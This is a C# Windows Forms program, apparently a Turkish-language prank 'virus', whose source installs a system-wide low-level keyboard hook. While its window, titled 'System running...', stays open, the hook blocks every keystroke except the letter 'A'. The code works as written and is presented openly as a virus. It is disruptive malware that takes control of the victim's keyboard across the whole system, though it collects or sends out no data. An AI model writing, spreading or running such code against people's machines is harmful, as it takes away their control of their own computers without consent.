using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Virüs
{
    public partial class Form1 : Form
    {
        // Windows API'leri
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private IntPtr _hookID = IntPtr.Zero;

        public Form1()
        {
            InitializeComponent();
            this.Text = "Sistem Çalışıyor...";
            _hookID = SetHook(HookCallback);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // 0x0100 = WM_KEYDOWN (Bir tuşa basılma anı)
            if (nCode >= 0 && wParam == (IntPtr)0x0100)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys basilanTus = (Keys)vkCode;

                // EĞER basılan tuş 'A' DEĞİLSE ( != operatörü "eşit değildir" demektir )
                if (basilanTus != Keys.A)
                {
                    // Windows'a "bu tuş vuruşunu görmezden gel" diyoruz
                    return (IntPtr)1;
                }
            }

            // Eğer tuş 'A' ise, CallNextHookEx ile sinyalin normal şekilde devam etmesine izin ver
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            UnhookWindowsHookEx(_hookID); // Kapatırken sistemi normale döndür
            base.OnFormClosing(e);
        }
    }
}